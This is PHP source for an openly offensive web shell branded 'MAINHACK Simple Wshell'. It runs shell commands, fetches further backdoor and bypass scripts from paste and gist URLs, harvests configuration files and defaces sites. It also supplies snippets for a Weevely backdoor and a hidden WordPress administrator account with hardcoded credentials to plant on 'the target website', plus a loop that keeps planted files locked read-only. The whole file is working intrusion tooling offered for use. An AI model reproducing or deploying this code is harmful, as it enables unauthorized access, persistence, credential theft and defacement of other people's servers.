...
<html>
	<head>
		<meta charset='utf-8'>
		<meta name='author' content='MAINHACK Simple Wshell'>
		...
		<title>MAINHACK Simple Wshell</title>
...
<a class='text-decoration-none text-light anu' href='" .$_SERVER["PHP_SELF"] ."'><h1>MAINHACK Simple Wshell | JACK1337</h1></a>";
if (isset($_1337["path"])) {
    $path = $_1337["path"];
    chdir($path);
} else {
...
if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['lockfile'])) {
    ...
    if ($tmpnya) {
        ...
        while (true) {
            ...
            if (MAINHACKperm("' . getcwd() . '/' . $namafilelos . '") != 0444) {
                chmod("' . getcwd() . '/' . $namafilelos . '", 0444);
            }
        }

        function MAINHACKperm($filename) {
...
if (isset($_POST['get'])) {
    ...
    if ($_POST['option'] == '1') {
        ...
        $fileName = getcwd() . '/MAINHACKadminer.php';
...
ErrorDocument 403 \"<html><head><title>Request Rejected by MAINHACK</title></head><body>The requested URL was rejected. Please consult with your administrator.</body></html>\"
ErrorDocument 404 \"<html><head><title>Request Rejected by MAINHACK</title></head><body>The requested URL was rejected. Please consult with your administrator.</body></html>\"");
        ?></code></pre>
...
$T=$u('',$r);$T();
    ...
    <p class="text-center">How to use? Just paste the code above in the php file, for example: index.php etc. then connect to weevely | terminal command: <em>weevely http://yoursite/yourfile.php MAINHACK</em><p>

				</div><?php
    } elseif ($_POST['option'] == '4') {
        $url = 'https://gist.github.com//JACK1337/0669c246ce2a1c7db5b5526210736238/raw/db9cc5aa7a6c6e7148a2650452f10f35d7449247/MAINHACKssi.shtml';
        $fileName = getcwd() . '/MAINHACKganteng-ssi.shtml';
    } elseif ($_POST['option'] == '5') {?>
<div class="container-fluid language-javascript mt-3">
        <div class="shell mb-3 position-relative"><pre style="font-size:10px;" id="code"><code>function MAINHACKadmin(){
$login = 'MAINHACK';
$passw = 'MAINHACKganteng13+13';
$email = 'MAINHACK-ganteng@proton.me';
...
add_action('init','MAINHACKadmin');</code></pre>
<button class="btn btn-danger btn-sm copy-button" onclick="copyToClipboard()">Copy</button>
</div>
<p class="text-center">How to use? Add the above code in the functions.php file on the target website. | example: https://example.go.id/wp-content/themes/[themes name]/functions.php</p>
        ...
        $url = 'https://gist.githubusercontent.com/JACK1337/9990c355f36adfff973c91566b7bd029/raw/f03036733fc951b00c0729fea94e3e1976f7f4d3/alfabypass.php';
        $fileName = getcwd() . '/MAINHACK-alfabepas.php';
    } elseif ($_POST['option'] == '7') {
        $url = 'https://gist.githubusercontent.com/JACK1337/82065e3ee7b7876f3917584245f52d9b/raw/5420deac465587fa29afbc2fb270443209c5c580/marijuanabypass.php';
        $fileName = getcwd() . '/MAINHACK-marijuana.php';
    } elseif ($_POST['option'] == '8') {
        $url = 'https://raw.githubusercontent.com/FlamXTna997/Priv8-Config-Grabber/master/config.php';
        $fileName = getcwd() . '/MAINHACK-config.php';
    } elseif ($_POST['option'] == '9') {
        $url = 'https://pst.innomi.net/paste/uo6cf3k4frw53f2rn9jot7fh/raw';
        $fileName = getcwd() . '/MAINHACK-tesla.php';
    } elseif ($_POST['option'] == '10') {
        $url = 'https://paste.idcloudhosting.my.id/paste/ofp7w/raw';
        $fileName = getcwd() . '/MAINHACK-bypasslitespeed.php';
        ...
        $fileName = getcwd() . '/MAINHACK-cmd.php';
    }
...
database.php";
    ...
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['sepconfig']) && isset($_POST['target_files'])) {
        $outputFilename = basename('MAINHACKconfigresult.txt');
    ...
    if ($_1337["id"] == "zoneh") {
        ...
        if ($_POST["submit"]) {
            ...
            <i class="bi bi-person"></i> Attacker Name: 
                <input type="text" class="form-control btn-sm text-dark" name="nick" size="50" placeholder="MAINHACK" id="nick">
    ...
    if ($_1337["id"] == "deface") {
		...
		<div class='card card-body text-dark input-group mb-3'>
			...
			<div class='form-check'>
				...
				<input class='form-control btn-sm text-dark' type='text' name='d_file' placeholder='MAINHACK.txt'>
				<i class='bi bi-code-square'></i> Your Script:
				<textarea class='form-control btn-sm text-dark' rows='7' name='script' placeholder='Hacked by MAINHACK'></textarea>
				<div class='d-grid gap-2'>
...
echo `$command`;
    ...
    <div class="form-group d-flex align-items-center">
        <input type="text" class="form-control form-control-sm text-dark flex-grow-1" placeholder="https://example.go.id/files/MAINHACKprivate.txt" name="url" id="url" required>
...
if (isset($_1337["filenew"])) {
    ...
    echo "
		<div class='mb-3'>
			<form method='POST'>
				<i class='bi bi-file-earmark'></i> Filename:
				<input class='form-control form-control-sm text-dark' type='text' name='name_file[]' placeholder='MAINHACK.txt' $_r>
				<i class='bi bi-code-square'></i> Your Script:
				<textarea class='form-control form-control-sm text-dark' name='contents_file' rows='7' placeholder='Hacked by MAINHACK' $_r></textarea>
				<div class='d-grid gap-2'><br>
...
echo "</tbody></table></div><center><div class='text-white'><hr><font color='white'>&copy; MAINHACK - JACK</font></div></center></body></html>";
?>
